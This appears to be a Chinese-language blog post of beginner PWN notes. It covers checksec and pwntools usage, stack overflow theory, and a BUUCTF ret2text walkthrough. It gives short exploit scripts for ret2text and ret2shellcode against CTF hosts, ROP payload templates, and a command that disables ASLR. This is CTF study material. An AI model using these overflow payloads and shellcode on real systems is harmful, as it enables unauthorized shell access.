@@ -1,0 +1,853 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Lixiney">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="环境配置 Python3 pip gdb-pwndbg 插件 pwntools IDA checksec  checksec 安装以及基本环境 使用 apt 安装的最新版的用不习惯，如果安装了pwntools，里面会自带checksec工具  sudo apt install checksec  用法  Arch  程序架构信息，判断该程序是32位还是64位程序，编写exp时选择 p32() 还是">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN 入门基础笔记">
+<meta property="og:url" content="https://blog.lixey.top/PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="Lixiney&#39;s Blog">
+<meta property="og:description" content="环境配置 Python3 pip gdb-pwndbg 插件 pwntools IDA checksec  checksec 安装以及基本环境 使用 apt 安装的最新版的用不习惯，如果安装了pwntools，里面会自带checksec工具  sudo apt install checksec  用法  Arch  程序架构信息，判断该程序是32位还是64位程序，编写exp时选择 p32() 还是">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.lixey.top/PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251005163822224.png">
+<meta property="og:image" content="https://blog.lixey.top/PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251008093049662.png">
+<meta property="og:image" content="https://blog.lixey.top/PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251008100208940.png">
+<meta property="og:image" content="https://blog.lixey.top/PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251008100722937.png">
+<meta property="og:image" content="https://blog.lixey.top/PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251008101019692.png">
+<meta property="og:image" content="https://blog.lixey.top/PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251008101221201.png">
+<meta property="og:image" content="https://blog.lixey.top/PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251013182957343.png">
+<meta property="og:image" content="https://blog.lixey.top/PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251013183541427.png">
+<meta property="og:image" content="https://blog.lixey.top/PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251013194932319.png">
+<meta property="og:image" content="https://blog.lixey.top/PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251013195047001.png">
+<meta property="og:image" content="https://blog.lixey.top/PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251013195802033.png">
+<meta property="og:image" content="https://blog.lixey.top/PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251013200151394.png">
+<meta property="og:image" content="https://blog.lixey.top/PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251013200743468.png">
+<meta property="og:image" content="https://blog.lixey.top/PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251013201019052.png">
+<meta property="og:image" content="https://blog.lixey.top/PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251013201509913.png">
+<meta property="article:published_time" content="2025-10-05T08:22:17.000Z">
+<meta property="article:modified_time" content="2025-10-24T14:56:08.029Z">
+<meta property="article:author" content="Lixiney">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog.lixey.top/PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251005163822224.png">
+  
+  
+  
+  <title>PWN 入门基础笔记 - Lixiney&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"blog.lixey.top","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="PWN 入门基础笔记"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-10-05 16:22" pubdate>
+          October 5, 2025 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.5k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          13 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">PWN 入门基础笔记</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><ul>
+<li>Python3</li>
+<li>pip</li>
+<li>gdb-pwndbg 插件</li>
+<li>pwntools</li>
+<li>IDA</li>
+<li>checksec</li>
+</ul>
+<h2 id="checksec-安装以及基本环境"><a href="#checksec-安装以及基本环境" class="headerlink" title="checksec 安装以及基本环境"></a>checksec 安装以及基本环境</h2><blockquote>
+<p>使用 apt 安装的最新版的用不习惯，如果安装了pwntools，里面会自带checksec工具</p>
+</blockquote>
+<div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install checksec</code></pre></div>
+
+<h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p><img src="/./PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251005163822224.png" srcset="/img/loading.gif" lazyload alt="image-20251005163822224"></p>
+<ul>
+<li>Arch</li>
+</ul>
+<p>程序架构信息，判断该程序是32位还是64位程序，编写exp时选择 p32() 还是 p64()</p>
+<ul>
+<li>RELRO</li>
+</ul>
+<p>Relocation Read-Only (RELRO) 此项技术主要针对 GOT 改写的攻击方式。它分为两种，Partial RELRO 和 Full RELRO。</p>
+<ul>
+<li>Stack</li>
+</ul>
+<p>栈溢出保护，如果看到这个选项没有开启则可以尝试栈溢出攻击</p>
+<ul>
+<li>NX</li>
+</ul>
+<p>NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，如此一来, 当攻击者在堆栈上部署自己的 shellcode 并触发时, 只会直接造成程序的崩溃，但是可以利用rop这种方法绕过</p>
+<ul>
+<li>PIE</li>
+</ul>
+<p>无关而执行文件，该技术是针对代码段落（.text），数据段（.data），未初始化全局变量段（bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，不能通过ROPgadget等工具来解题</p>
+<h2 id="pwntools-安装以及基本用法"><a href="#pwntools-安装以及基本用法" class="headerlink" title="pwntools 安装以及基本用法"></a>pwntools 安装以及基本用法</h2><ul>
+<li>使用 pip 安装 (win)</li>
+</ul>
+<div class="code-wrapper"><pre><code class="hljs bash">pip install pwntools</code></pre></div>
+
+<ul>
+<li>使用 apt 安装 (Linux)</li>
+</ul>
+<div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install python3-pwntools</code></pre></div>
+
+<h3 id="用法-1"><a href="#用法-1" class="headerlink" title="用法"></a>用法</h3><ol>
+<li>导入模块</li>
+</ol>
+<div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</code></pre></div>
+
+<ol start="2">
+<li>打开链接</li>
+</ol>
+<div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 本地连接</span>
+io = process(<span class="hljs-string">&quot;文件&quot;</span>)
+
+<span class="hljs-comment"># 远程连接</span>
+io = remote(<span class="hljs-string">&quot;[ip]&quot;</span>,[端口])</code></pre></div>
+
+<ol start="3">
+<li>从服务器接收数据</li>
+</ol>
+<div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#接收一行数据</span>
+io.revcline()
+
+<span class="hljs-comment"># 全部接收</span>
+io.recv()
+
+<span class="hljs-comment"># 在读到 test 之前一直读入数据</span>
+io.recvuntil(<span class="hljs-string">&#x27;test&#x27;</span>)
+
+<span class="hljs-comment"># 读入 10 位数据</span>
+io.recv(<span class="hljs-number">10</span>)</code></pre></div>
+
+<ol start="4">
+<li>向服务器发送数据</li>
+</ol>
+<div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 发送一行数据</span>
+io.sendline()
+
+<span class="hljs-comment"># 如果是32位程序则需要把数据打包成32比特宽度的字节流的形式</span>
+io.sendline(p32(<span class="hljs-string">&#x27;&#x27;</span>))
+
+<span class="hljs-comment"># 如果是64位程序</span>
+io.sendline(p64(<span class="hljs-string">&#x27;&#x27;</span>))</code></pre></div>
+
+<ol start="5">
+<li>进入交互模式</li>
+</ol>
+<div class="code-wrapper"><pre><code class="hljs python">io.interactive()</code></pre></div>
+
+
+
+<h1 id="栈溢出-（Stack-Overflow）"><a href="#栈溢出-（Stack-Overflow）" class="headerlink" title="栈溢出 （Stack Overflow）"></a>栈溢出 （Stack Overflow）</h1><blockquote>
+<p>一种后进先出的数据结构</p>
+</blockquote>
+<p><img src="/./PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251008093049662.png" srcset="/img/loading.gif" lazyload alt="image-20251008093049662"></p>
+<p>栈是计算机内存中的一块特殊区域，用于存储<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8&spm=1001.2101.3001.7020">函数调用</a>时的局部变量、函数参数、返回地址等信息。栈遵循后进先出（LIFO）的原则，即最后进入栈的数据最先被取出。</p>
+<p>栈是从高地址向低地址延伸的。每个函数的每次调用，都有它自己独立的一个栈帧，这个栈帧中维持着所需要的各种信息。寄存器ebp指向当前的栈帧的底部（高地址），寄存器esp指向当前的栈帧的顶部（低地址）</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>栈溢出指的是在程序向栈中写入数据时，程序没有限制输入数据的大小，写入的数据量超过了栈的剩余空间，导致数据溢出到相邻的内存区域，覆盖了原本不应被修改的数据，如函数的返回地址，所以攻击者可以构造恶意代码来 getshell</p>
+<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><blockquote>
+<p>Return To Text</p>
+<p>这里用 buuctf PWN 方向第二题 rip </p>
+</blockquote>
+<h3 id="信息搜集阶段"><a href="#信息搜集阶段" class="headerlink" title="信息搜集阶段"></a>信息搜集阶段</h3><ol>
+<li>拿到程序之后先检查一下程序的位数，看看用 ida64 还是 ida32</li>
+</ol>
+<p><img src="/./PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251008100208940.png" srcset="/img/loading.gif" lazyload></p>
+<ol start="2">
+<li>checksec 检查一下程序的保护状态，可以看到 Stack 栈溢出保护没有开，所以有很大可能是栈溢出</li>
+</ol>
+<p><img src="/./PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251008100722937.png" srcset="/img/loading.gif" lazyload alt="image-20251008100722937"></p>
+<h3 id="在-ida-中分析程序"><a href="#在-ida-中分析程序" class="headerlink" title="在 ida 中分析程序"></a>在 ida 中分析程序</h3><ol>
+<li>使用 ida64 打开程序</li>
+</ol>
+<p><img src="/./PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251008101019692.png" srcset="/img/loading.gif" lazyload alt="image-20251008101019692"></p>
+<ol start="2">
+<li>在左侧的栏内找到 main 函数，双击之后按 Tab 键可以查看反编译后的伪代码</li>
+</ol>
+<p><img src="/./PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251008101221201.png" srcset="/img/loading.gif" lazyload alt="image-20251008101221201"></p>
+<ol start="3">
+<li>可以看到有一个 gets 函数，基本上确定是栈溢出攻击了。	</li>
+<li>双击变量 s 查看栈帧，可以推断出来需要填充的垃圾数据的长度  0xF + ebp [如果是 64 位程序就是 <code>8</code>，如果是32位程序就是 <code>4</code>]</li>
+</ol>
+<p><img src="/./PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251013182957343.png" srcset="/img/loading.gif" lazyload alt="image-20251013182957343">	</p>
+<h3 id="确定垃圾字符的长度"><a href="#确定垃圾字符的长度" class="headerlink" title="确定垃圾字符的长度"></a>确定垃圾字符的长度</h3><blockquote>
+<p>在上一步操作中已经推断出来了，但是还有另外几种方法，在此记录一下，具体以 gdb 调试的结果为准</p>
+</blockquote>
+<ol>
+<li>使用 <code>堆栈指针</code> ， 在 <code>选项 - 常规 </code> 中 勾选 <code>堆栈指针</code></li>
+</ol>
+<p><img src="/./PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251013183541427.png" srcset="/img/loading.gif" lazyload alt="image-20251013183541427"></p>
+<p>可以确定长度 为 <code>0x18</code></p>
+<ol start="2">
+<li><p>使用 pwngdb 调试</p>
+<ol>
+<li><code>gdb + 文件名</code> 进入gdb调试界面</li>
+<li><code>starti</code> 执行 <code> disass main</code> 查看 main 函数的反汇编代码，<code>b *[16进制地址]</code> 在输入数据的地方打断点</li>
+<li><code>run</code> 运行程序 <code>n</code> 输入输入 <code>AAAAAAA</code> ，在 0x7fffffffdd61 处输入 ，在 0x7fffffffdd78 之后跳出</li>
+</ol>
+<p> <img src="/./PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251013194932319.png" srcset="/img/loading.gif" lazyload alt="image-20251013194932319"></p>
+<p> <img src="/./PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251013195047001.png" srcset="/img/loading.gif" lazyload alt="image-20251013195047001"></p>
+<ol start="4">
+<li><code>p/d 地址1-地址2</code>  计算一下要填充垃圾字符的位数，得到 长度为 <code>23</code> 是个不是 8 的倍数，同时又是一个64位的程序，所以要考虑 <code>堆栈平衡</code> 的问题</li>
+</ol>
+</li>
+<li><p>使用 msf 自带的命令生成垃圾字符</p>
+<ol>
+<li><code>msf-pattern_create -l 400</code> 生成一段长度为 400 的垃圾字符</li>
+</ol>
+<p> <img src="/./PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251013195802033.png" srcset="/img/loading.gif" lazyload alt="image-20251013195802033"></p>
+<ol start="2">
+<li>依旧是进入 <code>pwngdb</code> 调试，打完断点之后在输入数据的地方将这个长度为 400 的字符串传进去，寻找 <code>RBP</code></li>
+</ol>
+<p> <img src="/./PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251013200151394.png" srcset="/img/loading.gif" lazyload alt="image-20251013200151394"></p>
+<ol start="3">
+<li><code>RBP</code> 只能截取到 <code>a6Aa</code> 说明被撑爆了，只需要看看 <code>a6Aa</code> 这个字符串在刚刚生成的字符串的位置即可</li>
+<li><code>msf-pattern_offset -q a6Aa</code> 算出来<code>19</code> 再加上 <code>a6Aa</code> 本身的长度<code>4</code> ，就是 <code>23</code></li>
+</ol>
+<p> <img src="/./PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251013200743468.png" srcset="/img/loading.gif" lazyload alt="image-20251013200743468"></p>
+</li>
+</ol>
+<h3 id="找到可以利用的shell函数地址"><a href="#找到可以利用的shell函数地址" class="headerlink" title="找到可以利用的shell函数地址"></a>找到可以利用的shell函数地址</h3><ol>
+<li>在 IDA 中 按 <code>SHIFT + F12</code> 可以查看可打印字符</li>
+</ol>
+<p><img src="/./PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251013201019052.png" srcset="/img/loading.gif" lazyload alt="image-20251013201019052"></p>
+<ol start="2">
+<li>双击之后 按<code>CTRL + X</code> 交叉引用一下，拿到地址为<code>0x40118A</code></li>
+</ol>
+<p><img src="/./PWN-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/image-20251013201509913.png" srcset="/img/loading.gif" lazyload alt="image-20251013201509913"></p>
+<h3 id="编写-EXP"><a href="#编写-EXP" class="headerlink" title="编写 EXP"></a>编写 EXP</h3><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+io = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">29582</span>)
+addr = <span class="hljs-number">0x40118A</span>
+payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">23</span> + p64(addr+<span class="hljs-number">1</span>) <span class="hljs-comment"># 堆栈平衡，所以这里要 +1</span>
+
+io.sendline(payload)
+io.interactive()</code></pre></div>
+
+
+
+<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><blockquote>
+<p>同样是栈溢出，但是程序中没有可以利用的后门函数，这个时候就需要生成shellcode</p>
+</blockquote>
+<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>攻击者需要将 shellcode （shell 的机器码）注入到内存当中，随后lion给栈溢出复写 return_address，使程序跳转至 shellcode 所在的内存地址</p>
+<p>注意 ： 需要在 <code>ASLR</code>  保护机制没有开启的情况下才能利用成功</p>
+<h3 id="ASLR-保护机制"><a href="#ASLR-保护机制" class="headerlink" title="ASLR 保护机制"></a>ASLR 保护机制</h3><blockquote>
+<p>地址随机化</p>
+</blockquote>
+<p>开启之后，每次程序加载是 stack、libaries、heap的基址都会随机化。</p>
+<p>三种状态</p>
+<ol>
+<li>随机化关闭</li>
+</ol>
+<div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</code></pre></div>
+
+
+
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><blockquote>
+<p>生成shellcode</p>
+</blockquote>
+<div class="code-wrapper"><pre><code class="hljs python">shell_code = asm(shellcraft.sh())</code></pre></div>
+
+<ul>
+<li>完整exp 案例</li>
+</ul>
+<div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+
+io = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">27627</span>)
+buf_addr = <span class="hljs-number">0x233000</span>
+offset = <span class="hljs-number">56</span>
+shell_code = asm(shellcraft.sh())
+payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">56</span> + p64(buf_addr)
+
+io.sendline(shell_code)
+io.recvline()
+io.sendline(payload)
+
+io.interactive()
+
+<span class="hljs-built_in">print</span>(payload)
+</code></pre></div>
+
+
+
+<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><h3 id="32位-ROP-链-构造"><a href="#32位-ROP-链-构造" class="headerlink" title="32位 ROP 链 构造"></a>32位 ROP 链 构造</h3><blockquote>
+<p>payload 格式</p>
+</blockquote>
+<div class="code-wrapper"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;a&#x27;</span> * [垃圾数据长度] + p32(_system 地址) + p32(<span class="hljs-number">0</span>) + p32(/<span class="hljs-built_in">bin</span>/sh 地址)</code></pre></div>
+
+
+
+<h3 id="64位-ROP-链-构造"><a href="#64位-ROP-链-构造" class="headerlink" title="64位 ROP 链 构造"></a>64位 ROP 链 构造</h3><blockquote>
+<p>payload 格式</p>
+</blockquote>
+<div class="code-wrapper"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;a&#x27;</span> * [垃圾数据长度] + p64(rdi) + p64(/<span class="hljs-built_in">bin</span>/sh 地址) + p64(_system 地址)</code></pre></div>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/PWN/" class="print-no-link">#PWN</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>PWN 入门基础笔记</div>
+      <div>https://blog.lixey.top/PWN-入门基础笔记/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Lixiney</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 5, 2025</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="PHP文件包含-伪协议">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">PHP文件包含-伪协议</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/" title="PHP反序列化-WriteUp">
+                        <span class="hidden-mobile">PHP反序列化-WriteUp</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
